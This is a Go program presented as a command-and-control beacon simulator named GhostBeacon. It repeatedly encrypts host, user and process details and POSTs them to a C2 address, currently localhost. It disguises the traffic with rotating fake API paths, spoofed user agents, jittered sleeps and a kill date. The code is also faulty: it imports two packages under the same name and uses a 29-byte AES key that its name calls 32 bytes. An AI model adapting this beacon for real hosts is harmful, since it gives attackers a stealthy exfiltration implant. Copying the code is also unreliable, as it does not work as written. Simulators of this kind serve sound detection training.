package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	serverURL = "http://127.0.0.1:8080"
	beaconMin = 8
	beaconMax = 20
	killDate  = "2026-12-31"
	key       = []byte("thisis32byteslongpassphrase!!")
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"curl/7.81.0",
	"Wget/1.21.3",
}

var paths = []string{
	"/api/v1/status",
	"/cdn/assets",
	"/auth/refresh",
	"/telemetry",
	"/updates/check",
}

func banner() {
	fmt.Println(`
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║  ███╗███████║██║   ██║███████╗   ██║   
██║   ██║██╔══██║██║   ██║╚════██║   ██║   
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   

GhostBeacon — C2 Beacon Simulator
`)
}

func killSwitch() {
	kill, _ := time.Parse("2006-01-02", killDate)
	if time.Now().After(kill) {
		fmt.Println("[!] Kill date reached. Exiting.")
		os.Exit(0)
	}
}

func randSleep() {
	d := rand.Intn(beaconMax-beaconMin) + beaconMin
	time.Sleep(time.Duration(d) * time.Second)
}

func encrypt(data []byte) string {
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)

	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)

	encrypted := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(encrypted)
}

func fakeSystemInfo() string {
	host, _ := os.Hostname()
	info := fmt.Sprintf(
		"host=%s|user=%s|pid=%d|time=%d",
		host,
		os.Getenv("USER"),
		os.Getpid(),
		time.Now().Unix(),
	)
	return encrypt([]byte(info))
}

func beacon() {
	client := &http.Client{Timeout: 10 * time.Second}

	path := paths[rand.Intn(len(paths))]
	ua := userAgents[rand.Intn(len(userAgents))]

	data := fakeSystemInfo()

	req, _ := http.NewRequest("POST", serverURL+path, bytes.NewBuffer([]byte(data)))
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Beacon failed")
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[+] Beaconed %s [%d]\n", path, resp.StatusCode)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	banner()

	fmt.Println("[*] Starting beacon loop")

	for {
		killSwitch()
		beacon()
		randSleep()
	}
}
